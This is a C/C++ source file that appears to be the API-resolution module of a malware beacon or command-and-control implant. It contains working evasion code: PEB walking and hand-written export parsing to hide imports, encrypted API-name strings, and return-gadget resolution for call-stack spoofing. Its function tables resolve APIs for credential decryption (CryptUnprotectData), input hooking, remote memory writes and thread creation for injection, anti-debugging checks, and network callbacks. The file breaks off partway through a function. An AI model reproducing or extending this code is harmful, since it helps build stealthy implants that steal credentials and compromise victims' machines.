#include <windows.h>
#include <x86intrin.h> // /usr/lib/llvm-19/lib/clang/19/include/mm3dnow.h:16:2: warning: "The <mm3dnow.h> header is deprecated, and 3dNow! intrinsics are unsupported. For other intrinsics, include <x86intrin.h>, instead."
#include <winnt.h>
#include "../include/resolver.h"
#include "../include/config_parser.h"
#include "../include/utils.h"
#include "../include/syscalls.h"
#include "../libs/bastia/bastia.h"

#define H_MAGIC_KEY       5381
#define H_MAGIC_SEED      5

#define RESOLVE_API_BY_NAME(funcName, baseModule) \
    funcTable->funcName = (p##funcName)__GetProcAddress(baseModule, #funcName);

storeintext_used static char regexstring_pebwalking1[]         = {'.'};

VOID __RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString == NULL) {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = NULL;
        return;
    }

    // Use pointer arithmetic for faster iteration
    PCWSTR end = SourceString;
    while (*end) end++;
    
    // Calculate length in bytes
    SIZE_T len = (end - SourceString);
    DestinationString->Length = (USHORT)(len * sizeof(WCHAR));
    DestinationString->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
    DestinationString->Buffer = (PWSTR)SourceString;
}

FARPROC WINAPI __GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (!hModule || !lpProcName) return NULL;

    // Calculate the DOS header
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    // Calculate the NT headers
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Locate the Export Directory
    IMAGE_DATA_DIRECTORY* exportDataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir->VirtualAddress == 0) return NULL;

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + exportDataDir->VirtualAddress);
    DWORD* nameRvas = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRvas = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    // Iterate over exported names to find the matching function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* funcName = (const char*)((BYTE*)hModule + nameRvas[i]);
        if (__strcmp(funcName, lpProcName) == 0) {
            WORD ordinal = ordinals[i];
            DWORD funcRva = funcRvas[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRva);
        }
    }

    return NULL; // Function not found
}

/* could be optimised with linear search, but speed gain is minimal */
HMODULE GetModuleBaseAddress(LPCWSTR ModuleName) {
    /*
        Assumes module is loaded in the PEB, i.e: is kernel32.dll OR ntdll.dll, or
        another module loaded before calling this funciton.
    */

    // Check module cache first (avoids PEB walk for already-cached modules)
    if (ModuleCache::g_moduleCache.initialized) {
        for (uint8_t i = 1; i < static_cast<uint8_t>(ModuleCache::Module::MAX); i++) {
            if (ModuleCache::g_moduleCache.entries[i].loaded && ModuleCache::g_moduleCache.entries[i].handle &&
                ModuleCache::g_moduleCache.entries[i].name &&
                __wcscmp(ModuleCache::g_moduleCache.entries[i].name, ModuleName) == 0) {
                return ModuleCache::g_moduleCache.entries[i].handle;
            }
        }
    }

    PPEB Peb = getCurrentPEB(); // x64: GS segment register


    // Traverse the InLoadOrderModuleList in the PEB
    LIST_ENTRY* moduleList = &Peb->LoaderData->InLoadOrderModuleList;
    LIST_ENTRY* entry = moduleList->Flink;

    while (entry != moduleList) {
        // Get the LDR_DATA_TABLE_ENTRY for this module
        PLDR_DATA_TABLE_ENTRY dataEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!dataEntry->DllBase || !dataEntry->BaseDllName.Buffer) {
            entry = entry->Flink;
            continue;
        }
        // Compare module name
        if (__wcsnicmp(ModuleName, dataEntry->BaseDllName.Buffer, __wcslen(ModuleName)) == 0) {
            HMODULE base = (HMODULE)dataEntry->DllBase;
            // Populate cache on PEB walk hit for future lookups
            if (ModuleCache::g_moduleCache.initialized) {
        for (uint8_t i = 1; i < static_cast<uint8_t>(ModuleCache::Module::MAX); i++) {
                    if (!ModuleCache::g_moduleCache.entries[i].loaded &&
                        ModuleCache::g_moduleCache.entries[i].name &&
                        __wcsicmp(ModuleCache::g_moduleCache.entries[i].name, ModuleName) == 0) {
                        ModuleCache::g_moduleCache.entries[i].handle = base;
                        ModuleCache::g_moduleCache.entries[i].loaded = true;
                        break;
                    }
                }
            }
            return base;
        }

        entry = entry->Flink; // Move to the next module
    }

    return NULL; // Module not found
}

HMODULE GetModuleBaseAddressA(LPCSTR ModuleName)
{
    if (!ModuleName) return NULL;

    // Stack buffer for wide string (64 chars is enough for DLL names)
    wchar_t wideName[64];

    // Convert ANSI to wide string
    size_t result = __mbstowcs(wideName, ModuleName, sizeof(wideName) / sizeof(wchar_t));
    if (result == (size_t)-1) {
        // Conversion failed
        return NULL;
    }

    // Ensure null-termination just in case
    wideName[sizeof(wideName)/sizeof(wchar_t) - 1] = L'\0';

    // Call the existing wide version
    return GetModuleBaseAddress(wideName);
}


UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName) {
    UINT64 functionAddress = 0;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

    // Checking that the image is valid PE file.
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return functionAddress;
    }

    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

    if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return functionAddress;
    }

    // Iterating the export directory.
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);

    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
        if (__stricmp((char*)(moduleBase + names[j]), functionName) == 0) {
            functionAddress = moduleBase + addresses[ordinals[j]];
            break;
        }
    }

    return functionAddress;
}

void ResolveStackChain(functionTable* funcTable, BeaconConfig* config) {
    if (!config || !config->stack_chain || config->stack_chain_count == 0) return;

    for (uint16_t i = 0; i < config->stack_chain_count; i++) {
        StackChainEntry* entry = &config->stack_chain[i];
        if (!entry->module || !entry->function) continue;

        HMODULE base = GetModuleBaseAddressA(entry->module);
        if (!base) {
            wchar_t wideModule[64];
            size_t conv = __mbstowcs(wideModule, entry->module, 64);
            if (conv == (size_t)-1) continue;
            wideModule[63] = L'\0';
            base = __LoadLibraryW(funcTable, wideModule);
        }
        if (!base) continue;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;

        IMAGE_DATA_DIRECTORY* expDataDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expDataDir->VirtualAddress == 0 || expDataDir->Size == 0) continue;

        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + expDataDir->VirtualAddress);
        DWORD* funcRvas = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);
        DWORD* nameRvas = (DWORD*)((BYTE*)base + exp->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)base + exp->AddressOfNameOrdinals);

        DWORD funcRva = 0;
        for (DWORD j = 0; j < exp->NumberOfNames; j++) {
            const char* name = (const char*)((BYTE*)base + nameRvas[j]);
            if (__stricmp(name, entry->function) == 0) {
                funcRva = funcRvas[ordinals[j]];
                break;
            }
        }
        if (funcRva == 0) continue;

        DWORD expDirStart = expDataDir->VirtualAddress;
        DWORD expDirEnd   = expDirStart + expDataDir->Size;
        if (funcRva >= expDirStart && funcRva < expDirEnd) continue;

        DWORD boundary = expDirEnd;
        for (DWORD k = 0; k < exp->NumberOfFunctions; k++) {
            if (funcRvas[k] > funcRva && funcRvas[k] < boundary) {
                boundary = funcRvas[k];
            }
        }

        BYTE* funcStart = (BYTE*)base + funcRva;
        BYTE* funcEnd   = (BYTE*)base + boundary;
        if (entry->offset != 0) {
            BYTE* target = funcStart + entry->offset;
            if (target < funcEnd) {
                entry->resolvedAddr = (UINT64)target;
            }
        } else {
            BYTE* lastRet = NULL;
            for (BYTE* p = funcStart; p < funcEnd; p++) {
                if (*p == 0xC3) lastRet = p;
            }
            if (lastRet) {
                entry->resolvedAddr = (UINT64)lastRet;
            }
        }
    }
}

// manual implementation to resolve function addresses
FARPROC GetExportedFunctionAddress(void *moduleBase, const char *functionName, LOADLIBRARYA pLoadLibraryA) {
    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)moduleBase;
    IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)((BYTE *)moduleBase + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER *optionalHeader = &ntHeaders->OptionalHeader;
    IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)moduleBase + optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *nameRvaArray = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    DWORD *funcRvaArray = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    WORD *ordinalsArray = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
        char *name = (char *)((BYTE *)moduleBase + nameRvaArray[i]);
        if (__strcmp(name, functionName) == 0) {
            WORD ordinal = ordinalsArray[i];
            DWORD funcRva = funcRvaArray[ordinal];
            BYTE *funcAddr = (BYTE *)moduleBase + funcRva;

            // Check if the function address is within the export directory, indicating a forwarded export
            if (funcAddr >= (BYTE *)exportDir && funcAddr < (BYTE *)exportDir + optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) {
                // The function is forwarded, resolve it
                char *forwardedTo = (char *)funcAddr;
                char forwardModule[256] = {0}, forwardFunction[256] = {0};
                char *separator = __strchr(forwardedTo, (int)regexstring_pebwalking1[0]);

                if (!separator || separator == forwardedTo) return NULL;

                // Copy module name
                size_t moduleLen = separator - forwardedTo;
                if (moduleLen >= sizeof(forwardModule)) moduleLen = sizeof(forwardModule) - 1;
                __memcpy(forwardModule, forwardedTo, moduleLen);
                forwardModule[moduleLen] = '\0';

                // Copy function name
                __strncpy(forwardFunction, separator + 1, sizeof(forwardFunction) - 1);

                // Load the module specified by the forwarded string using the resolved LoadLibraryA
                HMODULE hForwardModule = pLoadLibraryA(forwardModule);
                if (!hForwardModule) return NULL;

                // Recursively resolve the forwarded function
                return GetExportedFunctionAddress(hForwardModule, forwardFunction, pLoadLibraryA);
            }

            return (FARPROC)funcAddr;
        }
    }
    return NULL;
}
#define STR_IMPL(x) #x
#define STR(x) STR_IMPL(x)  // Double-layer for macro expansion

#define RESOLVE(t, hModule, FUNCNAME) \
    do { \
        t->FUNCNAME = (p##FUNCNAME) __GetProcAddress(hModule, lcg_encrypt(STR(FUNCNAME))); \
    } while(0)

static bool LoadWinHttp(functionTable* funcTable) {
    HMODULE WinHttpBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::WINHTTP);

    RESOLVE(funcTable, WinHttpBase, WinHttpOpen);
    RESOLVE(funcTable, WinHttpBase, WinHttpConnect);
    RESOLVE(funcTable, WinHttpBase, WinHttpOpenRequest);
    RESOLVE(funcTable, WinHttpBase, WinHttpSendRequest);
    RESOLVE(funcTable, WinHttpBase, WinHttpReceiveResponse);
    RESOLVE(funcTable, WinHttpBase, WinHttpQueryHeaders);
    RESOLVE(funcTable, WinHttpBase, WinHttpReadData);
    RESOLVE(funcTable, WinHttpBase, WinHttpCrackUrl);
    RESOLVE(funcTable, WinHttpBase, WinHttpSetOption);
    RESOLVE(funcTable, WinHttpBase, WinHttpAddRequestHeaders);
    RESOLVE(funcTable, WinHttpBase, WinHttpQueryDataAvailable);
    RESOLVE(funcTable, WinHttpBase, WinHttpSetTimeouts);
    return true;
}

static bool LoadAdvapi(functionTable* funcTable) {
    HMODULE Advapi32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::ADVAPI32);
    RESOLVE(funcTable, Advapi32Base, RegOpenKeyExA);
    RESOLVE(funcTable, Advapi32Base, RegQueryValueExW);
    RESOLVE(funcTable, Advapi32Base, RegSetValueExA);
    RESOLVE(funcTable, Advapi32Base, RegCloseKey);
    RESOLVE(funcTable, Advapi32Base, CryptReleaseContext);
    RESOLVE(funcTable, Advapi32Base, CryptDestroyHash);
    RESOLVE(funcTable, Advapi32Base, CryptGetHashParam);
    RESOLVE(funcTable, Advapi32Base, CryptAcquireContextW);
    RESOLVE(funcTable, Advapi32Base, CryptHashData);
    RESOLVE(funcTable, Advapi32Base, CryptCreateHash);
    RESOLVE(funcTable, Advapi32Base, CryptGenRandom);
    RESOLVE(funcTable, Advapi32Base, GetUserNameW);
    RESOLVE(funcTable, Advapi32Base, OpenProcessToken);
    RESOLVE(funcTable, Advapi32Base, GetTokenInformation);
    return true;
}

static bool LoadGdi(functionTable* funcTable) {
    HMODULE gdiBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::GDI32);
    (void)gdiBase;
    return true;
}

static bool LoadShell32(functionTable* funcTable) {
    HMODULE Shell32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::SHELL32);
    funcTable->SHGetFolderPathW = (pSHGetFolderPathW) __GetProcAddress(Shell32Base, lcg_encrypt("SHGetFolderPathW"));
    return true;
}

static bool LoadCrypt32(functionTable* funcTable) {
    HMODULE Crypt32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::CRYPT32);
    RESOLVE(funcTable, Crypt32Base, CryptUnprotectData);
    RESOLVE(funcTable, Crypt32Base, CryptStringToBinaryA);
    RESOLVE(funcTable, Crypt32Base, CryptStringToBinaryW);
    RESOLVE(funcTable, Crypt32Base, CryptBinaryToStringA);
    RESOLVE(funcTable, Crypt32Base, CertGetCertificateContextProperty);
    RESOLVE(funcTable, Crypt32Base, CertFreeCertificateContext);
    RESOLVE(funcTable, Crypt32Base, CertDuplicateCertificateContext);
    RESOLVE(funcTable, Crypt32Base, CertGetIssuerCertificateFromStore);
    RESOLVE(funcTable, Crypt32Base, CertVerifySubjectCertificateContext);
    RESOLVE(funcTable, Crypt32Base, CertCreateCertificateContext);
    RESOLVE(funcTable, Crypt32Base, CertSetCertificateContextProperty);
    return true;
}

static bool LoadWs2_32(functionTable* funcTable) {
    HMODULE ws2_32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::WS2_32);
    RESOLVE(funcTable, ws2_32Base, WSAStartup);
    RESOLVE(funcTable, ws2_32Base, WSACleanup);
    RESOLVE(funcTable, ws2_32Base, WSAGetLastError);
    RESOLVE(funcTable, ws2_32Base, getaddrinfo);
    RESOLVE(funcTable, ws2_32Base, freeaddrinfo);
    RESOLVE(funcTable, ws2_32Base, socket);
    RESOLVE(funcTable, ws2_32Base, closesocket);
    RESOLVE(funcTable, ws2_32Base, bind);
    RESOLVE(funcTable, ws2_32Base, connect);
    RESOLVE(funcTable, ws2_32Base, accept);
    RESOLVE(funcTable, ws2_32Base, send);
    RESOLVE(funcTable, ws2_32Base, recv);
    RESOLVE(funcTable, ws2_32Base, Ioctlsocket);
    RESOLVE(funcTable, ws2_32Base, inet_addr);
    RESOLVE(funcTable, ws2_32Base, Getpeername);
    RESOLVE(funcTable, ws2_32Base, Getsockname);
    RESOLVE(funcTable, ws2_32Base, Getsockopt);
    RESOLVE(funcTable, ws2_32Base, select);
    RESOLVE(funcTable, ws2_32Base, __WSAFDIsSet);
    RESOLVE(funcTable, ws2_32Base, InetNtopA);
    return true;
}

static bool LoadMpr(functionTable* funcTable) {
    HMODULE MprBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::MPR);
    funcTable->WNetGetProviderNameW = (pWNetGetProviderNameW) __GetProcAddress(MprBase, lcg_encrypt("WNetGetProviderNameW"));
    return true;
}

#ifndef DEBUG
    __attribute__((unused))
#endif
static bool LoadCRT(functionTable* funcTable) {
    #ifdef DEBUG
        HMODULE msvcrtBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::MSVCRT);
        funcTable->printf = (pPrintf) __GetProcAddress(msvcrtBase, lcg_encrypt("printf"));
        funcTable->puts   = (pPuts)   __GetProcAddress(msvcrtBase, lcg_encrypt("puts"));
    #endif
    return true;
}

static bool LoadSChannel(functionTable* funcTable) {
    HMODULE secur32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::SECUR32);
    RESOLVE(funcTable, secur32Base, AcquireCredentialsHandleA);
    RESOLVE(funcTable, secur32Base, InitializeSecurityContextA);
    RESOLVE(funcTable, secur32Base, CompleteAuthToken);
    RESOLVE(funcTable, secur32Base, QueryContextAttributes);
    RESOLVE(funcTable, secur32Base, FreeContextBuffer);
    RESOLVE(funcTable, secur32Base, DeleteSecurityContext);
    RESOLVE(funcTable, secur32Base, FreeCredentialsHandle);
    RESOLVE(funcTable, secur32Base, ApplyControlToken);
    RESOLVE(funcTable, secur32Base, EncryptMessage);
    RESOLVE(funcTable, secur32Base, DecryptMessage);
    RESOLVE(funcTable, secur32Base, QuerySecurityPackageInfoA);
    return true;
}

static bool LoadBcrypt(functionTable* funcTable) {
    HMODULE hBcrypt = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::BCRYPT);
    funcTable->BCryptGenRandom = (pBCryptGenRandom)__GetProcAddress(hBcrypt, lcg_encrypt("BCryptGenRandom"));
    return true;
}

static bool LoadUser32(functionTable* funcTable) {
    HMODULE user32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::USER32);
    RESOLVE(funcTable, user32Base, GetDC);
    RESOLVE(funcTable, user32Base, ReleaseDC);
    RESOLVE(funcTable, user32Base, GetSystemMetrics);
    RESOLVE(funcTable, user32Base, PostMessageW);
    RESOLVE(funcTable, user32Base, CallNextHookEx);
    RESOLVE(funcTable, user32Base, UnhookWindowsHookEx);
    RESOLVE(funcTable, user32Base, KillTimer);
    RESOLVE(funcTable, user32Base, TranslateMessage);
    RESOLVE(funcTable, user32Base, DispatchMessageA);
    RESOLVE(funcTable, user32Base, GetMessageW);
    RESOLVE(funcTable, user32Base, SetWindowsHookExW);
    RESOLVE(funcTable, user32Base, CreateWindowExW);
    RESOLVE(funcTable, user32Base, RegisterClassW);
    RESOLVE(funcTable, user32Base, GetSysColorBrush);
    RESOLVE(funcTable, user32Base, LoadCursorW);
    RESOLVE(funcTable, user32Base, GetCursorPos);
    RESOLVE(funcTable, user32Base, FindWindowW);
    RESOLVE(funcTable, user32Base, SetTimer);
    RESOLVE(funcTable, user32Base, DestroyWindow);
    RESOLVE(funcTable, user32Base, GetWindowRect);
    RESOLVE(funcTable, user32Base, GetClientRect);
    RESOLVE(funcTable, user32Base, DefWindowProcW);
    RESOLVE(funcTable, user32Base, MessageBeep);
    RESOLVE(funcTable, user32Base, ShowWindow);
    RESOLVE(funcTable, user32Base, GetDoubleClickTime);
    RESOLVE(funcTable, user32Base, MessageBoxA);
    return true;
}

static bool LoadIphlpapi(functionTable* funcTable) {
    HMODULE iphlpapiBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::IPHLPAPI);
    funcTable->GetAdaptersAddresses = (pGetAdaptersAddresses) __GetProcAddress(iphlpapiBase, lcg_encrypt("GetAdaptersAddresses"));
    return true;
}

static bool LoadOleAuth32(functionTable* funcTable) {
    HMODULE oleAuthBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::OLEAUT32);
    funcTable->VariantClear   = (pVariantClear) __GetProcAddress(oleAuthBase, lcg_encrypt("VariantClear"));
    funcTable->VariantInit    = (pVariantInit)  __GetProcAddress(oleAuthBase, lcg_encrypt("VariantInit"));
    return true;
}

/* ============================================================================
 * Template specializations for compile-time dispatch in REQUIRES_MODULE.
 * Only these few are ever instantiated, the remaining Load* functions become
 * dead code and are stripped by LTO.
 * ============================================================================ */

template<> bool ModuleCache::LoadModule<ModuleCache::Module::ADVAPI32>(functionTable* funcTable) {
    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::ADVAPI32);
    if (!hMod) return false;
    LoadAdvapi(funcTable);
    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::ADVAPI32));
    return true;
}
template<> bool ModuleCache::LoadModule<ModuleCache::Module::IPHLPAPI>(functionTable* funcTable) {
    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::IPHLPAPI);
    if (!hMod) return false;
    LoadIphlpapi(funcTable);
    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::IPHLPAPI));
    return true;
}
template<> bool ModuleCache::LoadModule<ModuleCache::Module::WINHTTP>(functionTable* funcTable) {
    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::WINHTTP);
    if (!hMod) return false;
    LoadWinHttp(funcTable);
    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::WINHTTP));
    return true;
}
template<> bool ModuleCache::LoadModule<ModuleCache::Module::BCRYPT>(functionTable* funcTable) {
    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::BCRYPT);
    if (!hMod) return false;
    LoadBcrypt(funcTable);
    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::BCRYPT));
    return true;
}

/* Explicit instantiations, makes these visible to other TUs  */
template<> bool ModuleCache::LoadModule<ModuleCache::Module::WS2_32>(functionTable* funcTable) {
    LoadWs2_32(funcTable);
    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::WS2_32));
    return true;
}

static VOID initntdll(functionTable* t, HMODULE ntdllBase) {
    RESOLVE(t, ntdllBase, NtClose);
    RESOLVE(t, ntdllBase, NtCreateFile);
    RESOLVE(t, ntdllBase, NtDeviceIoControlFile);
    RESOLVE(t, ntdllBase, NtCreateUserProcess);
    RESOLVE(t, ntdllBase, NtCreateThreadEx);
    RESOLVE(t, ntdllBase, NtQueryDirectoryFile);
    RESOLVE(t, ntdllBase, NtQueryVolumeInformationFile);
    RESOLVE(t, ntdllBase, NtQueryInformationFile);
    RESOLVE(t, ntdllBase, NtReadFile);
    RESOLVE(t, ntdllBase, NtWriteFile);
    RESOLVE(t, ntdllBase, NtSetInformationFile);
    RESOLVE(t, ntdllBase, NtOpenFile);
    RESOLVE(t, ntdllBase, NtDeleteFile);
    RESOLVE(t, ntdllBase, NtCreateProcess);
    RESOLVE(t, ntdllBase, NtOpenProcess);
    RESOLVE(t, ntdllBase, NtTerminateProcess);
    RESOLVE(t, ntdllBase, NtTerminateThread);
    RESOLVE(t, ntdllBase, NtWaitForSingleObject);
    RESOLVE(t, ntdllBase, NtAllocateVirtualMemory);
    RESOLVE(t, ntdllBase, NtProtectVirtualMemory);
    RESOLVE(t, ntdllBase, NtWriteVirtualMemory);
    RESOLVE(t, ntdllBase, NtResumeThread);
    RESOLVE(t, ntdllBase, NtContinue);
    RESOLVE(t, ntdllBase, NtGetContextThread);
    RESOLVE(t, ntdllBase, NtSetContextThread);
    RESOLVE(t, ntdllBase, RtlCreateTimerQueue);
    RESOLVE(t, ntdllBase, RtlCreateTimer);
    RESOLVE(t, ntdllBase, NtQueryVirtualMemory);
    RESOLVE(t, ntdllBase, NtFreeVirtualMemory);
    RESOLVE(t, ntdllBase, NtCreateSection);
    RESOLVE(t, ntdllBase, NtOpenSection);
    RESOLVE(t, ntdllBase, NtMapViewOfSection);
    RESOLVE(t, ntdllBase, NtUnmapViewOfSection);
    RESOLVE(t, ntdllBase, NtOpenDirectoryObject);
    RESOLVE(t, ntdllBase, NtQueryInformationProcess);
    RESOLVE(t, ntdllBase, NtFlushInstructionCache);
    RESOLVE(t, ntdllBase, NtQuerySystemInformation);
    RESOLVE(t, ntdllBase, NtInitiatePowerAction);
    RESOLVE(t, ntdllBase, RtlQueueWorkItem);
    RESOLVE(t, ntdllBase, NtCreateEvent);
    RESOLVE(t, ntdllBase, NtDelayExecution);
    RESOLVE(t, ntdllBase, NtQuerySystemTime);
    RESOLVE(t, ntdllBase, RtlCreateProcessParametersEx);
    RESOLVE(t, ntdllBase, RtlCaptureContext);
    RESOLVE(t, ntdllBase, RtlFreeHeap);
    RESOLVE(t, ntdllBase, RtlAllocateHeap);
    RESOLVE(t, ntdllBase, RtlRandomEx);
    RESOLVE(t, ntdllBase, RtlWaitOnAddress);
    RESOLVE(t, ntdllBase, RtlWakeByAddressSingle);
    RESOLVE(t, ntdllBase, LdrLoadDll);
    RESOLVE(t, ntdllBase, NtSetEvent);
    RESOLVE(t, ntdllBase, NtOpenKey);
    RESOLVE(t, ntdllBase, NtQueryValueKey);
    RESOLVE(t, ntdllBase, NtSetValueKey);
    RESOLVE(t, ntdllBase, RtlFormatCurrentUserKeyPath);
    RESOLVE(t, ntdllBase, RtlFreeUnicodeString);
    RESOLVE(t, ntdllBase, RtlInitUnicodeString);
    RESOLVE(t, ntdllBase, NtSetInformationThread);
    RESOLVE(t, ntdllBase, NtQueryInformationThread);
    RESOLVE(t, ntdllBase, NtOpenThread);
    RESOLVE(t, ntdllBase, NtSuspendThread);
    RESOLVE(t, ntdllBase, TpReleaseWork);
    RESOLVE(t, ntdllBase, TpPostWork);
    RESOLVE(t, ntdllBase, TpAllocWork);
    RESOLVE(t, ntdllBase, RtlTimeToSecondsSince1970);
    RESOLVE(t, ntdllBase, RtlDosPathNameToRelativeNtPathName_U);
    RESOLVE(t, ntdllBase, NtReadVirtualMemory);
    RESOLVE(t, ntdllBase, NtCreateProcessEx);
    RESOLVE(t, ntdllBase, RtlAddVectoredExceptionHandler);
    RESOLVE(t, ntdllBase, RtlRemoveVectoredExceptionHandler);
}


static VOID initkernel32(functionTable* t, HMODULE kernel32Base) {
    RESOLVE(t, kernel32Base, CreateProcessA);
    RESOLVE(t, kernel32Base, CreateFileA);
    RESOLVE(t, kernel32Base, ReadFile);
    RESOLVE(t, kernel32Base, WriteFile);
    RESOLVE(t, kernel32Base, CreatePipe);
    RESOLVE(t, kernel32Base, SetHandleInformation);
    RESOLVE(t, kernel32Base, Sleep);
    RESOLVE(t, kernel32Base, GetFileSize);
    RESOLVE(t, kernel32Base, GetFileAttributesA);
    RESOLVE(t, kernel32Base, FindFirstFileA);
    RESOLVE(t, kernel32Base, FindNextFileA);
    RESOLVE(t, kernel32Base, MultiByteToWideChar);
    RESOLVE(t, kernel32Base, GetCurrentDirectoryA);
    RESOLVE(t, kernel32Base, DeleteFileA);
    RESOLVE(t, kernel32Base, GlobalMemoryStatusEx);
    RESOLVE(t, kernel32Base, GetModuleFileNameA);
    RESOLVE(t, kernel32Base, CopyFileA);
    RESOLVE(t, kernel32Base, CreateMutexW);
    RESOLVE(t, kernel32Base, OpenMutexW);
    RESOLVE(t, kernel32Base, LoadLibraryA);
    RESOLVE(t, kernel32Base, SetFileAttributesA);
    RESOLVE(t, kernel32Base, GetTickCount);
    RESOLVE(t, kernel32Base, GetLastError);
    RESOLVE(t, kernel32Base, GetFileSizeEx);
    RESOLVE(t, kernel32Base, CheckRemoteDebuggerPresent);           
    RESOLVE(t, kernel32Base, GetSystemTimeAsFileTime);
    RESOLVE(t, kernel32Base, FileTimeToSystemTime);
    RESOLVE(t, kernel32Base, CreateToolhelp32Snapshot);         
    RESOLVE(t, kernel32Base, LocalAlloc);
    RESOLVE(t, kernel32Base, LocalFree);
    RESOLVE(t, kernel32Base, GetConsoleWindow);
    RESOLVE(t, kernel32Base, GetSystemInfo);
    RESOLVE(t, kernel32Base, GetComputerNameW);
    RESOLVE(t, kernel32Base, GetComputerNameExW);
    RESOLVE(t, kernel32Base, QueryFullProcessImageNameW);
    RESOLVE(t, kernel32Base, IsWow64Process);
    RESOLVE(t, kernel32Base, FindResourceA);
    RESOLVE(t, kernel32Base, LoadResource);
    RESOLVE(t, kernel32Base, SizeofResource);
    RESOLVE(t, kernel32Base, LockResource);
    RESOLVE(t, kernel32Base, GetThreadContext);
    RESOLVE(t, kernel32Base, SetThreadContext);
    RESOLVE(t, kernel32Base, DisableThreadLibraryCalls);
    RESOLVE(t, kernel32Base, FlushFileBuffers);
}

static VOID initwide(functionTable* t, HMODULE kernel32Base) {
    RESOLVE(t, kernel32Base, CreateProcessW);
    RESOLVE(t, kernel32Base, GetFileAttributesW);
    RESOLVE(t, kernel32Base, FindFirstFileW);
    RESOLVE(t, kernel32Base, FindNextFileW);
    RESOLVE(t, kernel32Base, GetCurrentDirectoryW);
